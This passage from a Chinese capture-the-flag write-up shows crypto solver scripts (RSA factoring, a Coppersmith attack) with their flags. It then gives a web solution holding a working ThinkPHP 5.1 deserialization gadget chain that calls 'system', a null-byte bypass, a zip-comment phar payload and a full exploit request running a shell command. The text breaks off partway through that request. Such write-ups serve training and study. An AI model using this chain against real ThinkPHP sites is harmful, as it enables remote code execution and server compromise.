130895897510277714768645984660240750580001372772665297920679701044966607241859495087319998825474727920273063120701389749480852403561022063673222963354420556267045325208933815212625081478538158049144348626000996650436898760300563194390820694376019146835381357141426987786643471325943646758131021529659151319632425988111406974492951170237774415667909612730440407365124264956213064305556185423432341935847320496716090528514947</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">b=<span class="built_in">int</span>(gcd(M1,M2+<span class="number">2</span>))</span><br><span class="line">b=<span class="built_in">int</span>(gcd(b,n))</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from z3 import *</span></span><br><span class="line"><span class="string">s=Solver()</span></span><br><span class="line"><span class="string">a,c=Ints(&#x27;a c&#x27;)</span></span><br><span class="line"><span class="string">s.add(a*a*b+b*b*a+b*b+a*b==M1)</span></span><br><span class="line"><span class="string">s.add(b*b*(c+1)+a*b*(c+1)-2==M2)</span></span><br><span class="line"><span class="string">if s.check()==sat:</span></span><br><span class="line"><span class="string">    print(s.model())</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">c=<span class="number">124117415943883977664751123530312411127969752596554845224788157371311249476587435058606174560086595402130942432433077285727410486606936603436679072115481556559754023776771158788066029212482977191449912364572356973349619609634451941137428490832382800157920373064845282558903378297473815085357523566726409862651</span></span><br><span class="line">a=<span class="number">117379993488408909213785887974472229016071265566403849836216754847295401565166151872329440545598767396499252325133419296775798211888305050776586647999185549171166433935032159605367762650398185050063643611720499373962310459705000471248897299568458251778545586376091559089442503748421906239117101764062329447353</span></span><br><span class="line"><span class="keyword">assert</span> n%(a*b*c)==<span class="number">0</span></span><br><span class="line">p_q=n//(a*b*c)</span><br><span class="line"><span class="built_in">print</span>(p_q)</span><br><span class="line">p=<span class="number">100879187056056327845688098549406745424207361197423093269692717108477600868962896860013904736765795306101216828969899092854909669522132180587302621989436957151756194757478353967989066938767945991388791271155482274102738851937877875741607885045831857778368069892408823414883083227349949611641923542904479147403</span></span><br><span class="line">q=<span class="number">100879187056056327845688098549406745424207361197423093269692717108477600868962896860013904736765795306101216828969899092854909669522132180587302621989436957151756194757478353967989066938767945991388791271155482274102738851937877875741607885045831857778368069892408823414883083227349949611641923542904479146623</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(a-<span class="number">1</span>)*(b-<span class="number">1</span>)*(c-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> n==a*b*c*p*q</span><br><span class="line">d=invert(<span class="number">0x10001</span>,phi)</span><br><span class="line">c=<span class="number">1394946766416873131554934453357121730676319808212515786127918041980606746238793432614766163520054818740952818682474896886923871330780883504028665380422608364542618561981233050210507202948882989763960702612116316321009210541932155301216511791505114282546592978453573529725958321827768703566503841883490535620591951871638499011781864202874525798224508022092610499899166738864346749753379399602574550324310119667774229645827773608873832795828636770263111832990012205276425559363977526114225540962861740929659841165039419904164961095126757294762709194552018890937638480126740196955840656602020193044969685334441405413154601311657668298101837066325231888411018908300828382192203062405287670490877283269761047853117971492197659115995537837080400730294215778540754482680476723953659085854297184575548489544772248049479632420289954409052781880871933713121875562554234841599323223793407272634167421053493995795570508435905280269774274084603687516219837730100396191746101622725880529896250904142333391598426588238082485305372659584052445556638990497626342509620305749829144158797491411816819447836265318302080212452925144191536031249404138978886262136129250971366841779218675482632242265233134997115987510292911606736878578493796260507458773824689843424248233282828057027197528977864826149756573867022173521177021297886987799897923182290515542397534652789013340264587028424629766689059507844211910072808286250914059983957934670979551428204569782238857331272372035625901349763799005621577332502957693517473861726359829588419409120076625939502382579605</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m)[<span class="number">256</span>:])</span><br><span class="line"><span class="comment">#D0g3&#123;296b680c-7aeb-5272-8b33-7335b411fbcb&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="Strange"><a href="#Strange" class="headerlink" title="Strange"></a>Strange</h3><p>加密的是m|hint,给了m&amp;hint和hint</p>
<p>首先根据hint和m&amp;hint可以知道m中哪些比特为1</p>
<p>然后这些已知为1的比特，设其它未知的比特为x,那么满足copper已知部分明文攻击，求出m|hint，所以最后当m&amp;hint为比特位为1则m对应位为1，当m|hint为1且hint为0则m对应位为1,综上可以还原m所有比特位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n,c,m2,hint=[<span class="number">13002904520196087913175026378157676218772224961198751789793139372975952998874109513709715017379230449514880674554473551508221946249854541352973100832075633211148140972925579736088058214014993082226530875284219933922497736077346225464349174819075866774069797318066487496627589111652333814065053663974480486379799102403118744672956634588445292675676671957278976483815342400168310432107890845293789670795394151784569722676109573685451673961309951157399183944789163591809561790491021872748674809148737825709985578568373545210653290368264452963080533949168735319775945818152681754882108865201849467932032981615400210529003</span>, <span class="number">8560367979088389639093355670052955344968008917787780010833158290316540154791612927595480968370338549837249823871244436946889198677945456273317343886485741297260557172704718731809632734567349815338988169177983222118718585249696953103962537942023413748690596354436063345873831550109098151014332237310265412976776977183110431262893144552042116871747127301026195142320678244525719655551498368460837394436842924713450715998795899172774573341189660227254331656916960984157772527015479797004423165812493802730996272276613362505737536007284308929288293814697988968407777480072409184261544708820877153825470988634588666018802</span>, <span class="number">9869907877594701353175281930839281485694004896356038595955883788511764488228640164047958227861871572990960024485992</span>, <span class="number">9989639419782222444529129951526723618831672627603783728728767345257941311870269471651907118545783408295856954214259681421943807855554571179619485975143945972545328763519931371552573980829950864711586524281634114102102055299443001677757487698347910133933036008103313525651192020921231290560979831996376634906893793239834172305304964022881699764957699708192080739949462316844091240219351646138447816969994625883377800662643645172691649337353080140418336425506119542396319376821324619330083174008060351210307698279022584862990749963452589922185709026197210591472680780996507882639014068600165049839680108974873361895144</span>]</span><br><span class="line">h=[<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(hint)[<span class="number">2</span>:]]</span><br><span class="line">hhh=h</span><br><span class="line"></span><br><span class="line">h_l=<span class="built_in">len</span>(<span class="built_in">bin</span>(hint)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment">#m_l为m,hint都为1的部分</span></span><br><span class="line">m_l=[<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(m2)[<span class="number">2</span>:].zfill(h_l)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(m_l))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">hint=0</span></span><br><span class="line"><span class="string">for i in range(len(h)):</span></span><br><span class="line"><span class="string">    hint+=h[i]*pow(2,len(h)-i-1)</span></span><br><span class="line"><span class="string">print(hint)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def decrypt(n,e,c,mbar,kbits):</span></span><br><span class="line"><span class="string">    beta = 1</span></span><br><span class="line"><span class="string">    nbits = n.nbits()</span></span><br><span class="line"><span class="string">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    f = (mbar + x)^e - c</span></span><br><span class="line"><span class="string">    x0 = f.small_roots(X=2^kbits, beta=1)[0]  </span></span><br><span class="line"><span class="string">   print(x0)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e = 3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mbar = 9989639419782222444529129951526723618831672627603783728728767345257941311870269471651907118545783408295856954214259681421943807855554571179619485975143945972545328763519931371552573980829950864711586524281634114102102055299443001677757487698347910133933036008103313525651192020921231290560979831996376634906893793239834172305304964022881699764957699708192080739949462316844091240219351646138447816969994625883377800662643645172691649337353080140418336425506119542396319376821324619330083174008060351210307698279022584862990749963452589922185709026197210591472680780996507882639014068600165049839680108974873361895144</span></span><br><span class="line"><span class="string">kbits =400</span></span><br><span class="line"><span class="string">decrypt(n,e,c,mbar,kbits)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">##hh为有一个为1</span></span><br><span class="line">hh=<span class="number">625351281758775854436696750193519647852347112455593164676552831622184938221557439012947515328144260585439847522581</span></span><br><span class="line">hh=[<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(hh)[<span class="number">2</span>:].zfill(h_l)]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(h_l):</span></span><br><span class="line"><span class="string">    if hh[i]==1 and h[i]==1:</span></span><br><span class="line"><span class="string">        print(&#x27;error&#x27;)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        hhh[i]=hh[i]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#hhh是有一个为1的部分</span></span><br><span class="line">m=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(h_l)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(h_l):</span><br><span class="line">    <span class="keyword">if</span> m_l[i]==<span class="number">1</span>:</span><br><span class="line">        m[i]=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> h[i]==<span class="number">0</span> <span class="keyword">and</span>  hh[i]==<span class="number">1</span>:</span><br><span class="line">        m[i]=<span class="number">1</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *    </span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,m)),<span class="number">2</span>)))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#D0g3&#123;R54_f4l1_1n_l0ve_with_CopperSmith_w0wow0!!&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ez-TP"><a href="#Ez-TP" class="headerlink" title="Ez_TP"></a>Ez_TP</h3><p>存在文件泄露 <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p><code>\application\index\controller\Index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="variable">$hello</span> = base64_encode(<span class="string">&#x27;Welcome to D0g3&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>])||<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hello&#x27;</span>])) <span class="keyword">exit</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;world&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            parse_str(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;world&#x27;</span>],<span class="variable">$haha</span>);</span><br><span class="line">            extract(<span class="variable">$haha</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$a</span>)) &#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="string">&#x27;hello.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$s</span> = base64_decode(<span class="variable">$hello</span>);</span><br><span class="line">        file_put_contents(<span class="string">&#x27;hello.txt&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> (file_get_contents(<span class="variable">$a</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以通过<code>world</code>注册变量，覆盖<code>$a</code>，<code>$hello</code>。</p>
<p>鉴于题目环境是<code>5.1.37</code>，应该是通过<code>file_get_contents</code>触发<code>phar</code>反序列化。</p>
<p>实测直接<code>phar</code>会报错，限制了数据大小，考虑通过其他格式触发</p>
<p>poc：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="keyword">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="comment">//TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将序列化内容写入zip注释，需要对特殊字符进行替换</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//bypass %00</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">process_serialized</span>(<span class="params"><span class="variable">$serialized</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$new</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$last</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$current</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;#\bs:([0-9]+):&quot;#&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(</span><br><span class="line">        <span class="variable">$current</span> &lt; strlen(<span class="variable">$serialized</span>) &amp;&amp;</span><br><span class="line">        preg_match(</span><br><span class="line">            <span class="variable">$pattern</span>, <span class="variable">$serialized</span>, <span class="variable">$matches</span>, PREG_OFFSET_CAPTURE, <span class="variable">$current</span></span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$p_start</span> = <span class="variable">$matches</span>[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$p_start_string</span> = <span class="variable">$p_start</span> + strlen(<span class="variable">$matches</span>[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">        <span class="variable">$length</span> = <span class="variable">$matches</span>[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="variable">$p_end_string</span> = <span class="variable">$p_start_string</span> + <span class="variable">$length</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Check if this really is a serialized string</span></span><br><span class="line">        <span class="keyword">if</span>(!(</span><br><span class="line">            strlen(<span class="variable">$serialized</span>) &gt; <span class="variable">$p_end_string</span> + <span class="number">2</span> &amp;&amp;</span><br><span class="line">            substr(<span class="variable">$serialized</span>, <span class="variable">$p_end_string</span>, <span class="number">2</span>) == <span class="string">&#x27;&quot;;&#x27;</span></span><br><span class="line">        ))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$current</span> = <span class="variable">$p_start_string</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$string</span> = substr(<span class="variable">$serialized</span>, <span class="variable">$p_start_string</span>, <span class="variable">$length</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Convert every special character to its S representation</span></span><br><span class="line">        <span class="variable">$clean_string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$string</span>); <span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$letter</span> = <span class="variable">$string</span>&#123;<span class="variable">$i</span>&#125;;</span><br><span class="line">            <span class="variable">$clean_string</span> .= ctype_print(<span class="variable">$letter</span>) &amp;&amp; <span class="variable">$letter</span> != <span class="string">&#x27;\\&#x27;</span> ?</span><br><span class="line">                <span class="variable">$letter</span> :</span><br><span class="line">                sprintf(<span class="string">&quot;\\%02x&quot;</span>, ord(<span class="variable">$letter</span>));</span><br><span class="line">            ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Make the replacement</span></span><br><span class="line">        <span class="variable">$new</span> .=</span><br><span class="line">            substr(<span class="variable">$serialized</span>, <span class="variable">$last</span>, <span class="variable">$p_start</span> - <span class="variable">$last</span>) .</span><br><span class="line">            <span class="string">&#x27;S:&#x27;</span> . <span class="variable">$matches</span>[<span class="number">1</span>][<span class="number">0</span>] . <span class="string">&#x27;:&quot;&#x27;</span> . <span class="variable">$clean_string</span> . <span class="string">&#x27;&quot;;&#x27;</span></span><br><span class="line">        ;</span><br><span class="line">        <span class="variable">$last</span> = <span class="variable">$p_end_string</span> + <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$current</span> = <span class="variable">$last</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$new</span> .= substr(<span class="variable">$serialized</span>, <span class="variable">$last</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$new</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成zip文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;test4.php&quot;</span>);</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = base64_decode(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> process_serialized(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = process_serialized(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> ZipArchive();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;open(<span class="string">&#x27;2.zip&#x27;</span>,ZipArchive::CREATE);</span><br><span class="line"><span class="variable">$zip</span>-&gt;addFromString(<span class="string">&#x27;ttt.txt&#x27;</span>, <span class="string">&#x27;ttt&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;setArchiveComment(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;close();</span><br></pre></td></tr></table></figure>

<p>读入zip文件并做加密编码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(file_get_contents(<span class="string">&quot;2.zip&quot;</span>)));</span><br></pre></td></tr></table></figure>

<p>请求获取flag：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?s=/index/index/hello&amp;lin=cat+/y0u_f0und_It</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1.12.220.15:19274</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>773</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">world</span>=a=phar://hello.txt/ttt.txt%<span class="number">26</span>hello=UEsDBAoAAAAAAC<span class="number">6</span>Me<span class="number">1</span>NJEIKwAwAAAAMAAAAHAAAAdHR<span class="number">0</span>LnR<span class="number">4</span>dHR<span class="number">0</span>dFBLAQI%<span class="number">2</span>FAwoAAAAAAC<span class="number">6</span>Me<span class="number">1</span>NJEIKwAwAAAAMAAAAHAAAAAAAAAAAAAAC<span class="number">2</span>gQAAAAB<span class="number">0</span>dHQudHh<span class="number">0</span>UEsFBgAAAAABAAEANQAAACgAAACvAU<span class="number">86</span>Mjc<span class="number">6</span>InRoaW<span class="number">5</span>rXHByb<span class="number">2</span>Nlc<span class="number">3</span>NccGlwZXNcV<span class="number">2</span>luZG<span class="number">93</span>cyI<span class="number">6</span>MTp<span class="number">7</span>UzozNDoiXDAwdGhpbmtcNWNwcm<span class="number">9</span>jZXNzXDVjcGlwZXNcNWNXaW<span class="number">5</span>kb<span class="number">3</span>dzXDAwZmlsZXMiO<span class="number">2</span>E<span class="number">6</span>MTp<span class="number">7</span>aTowO<span class="number">086</span>MTc<span class="number">6</span>InRoaW<span class="number">5</span>rXG<span class="number">1</span>vZGVsXFBpdm<span class="number">90</span>IjoyOntTOjk<span class="number">6</span>IlwwMCpcMDBhcHBlbmQiO<span class="number">2</span>E<span class="number">6</span>MTp<span class="number">7</span>UzozOiJsaW<span class="number">4</span>iO<span class="number">2</span>E<span class="number">6</span>Mjp<span class="number">7</span>aTowO<span class="number">1</span>M<span class="number">6</span>ODoiY<span class="number">2</span>FsYy<span class="number">5</span>leGUiO<span class="number">2</span>k<span class="number">6</span>MTtTOjQ<span class="number">6</span>ImNhbGMiO<span class="number">319</span>UzoxNzoiXDAwdGhpbmtcNWNNb<span class="number">2</span>RlbFwwMGRhdGEiO<span class="number">2</span>E<span class="number">6</span>MTp<span class="number">7</span>UzozOiJsaW<span class="number">4</span>iO<span 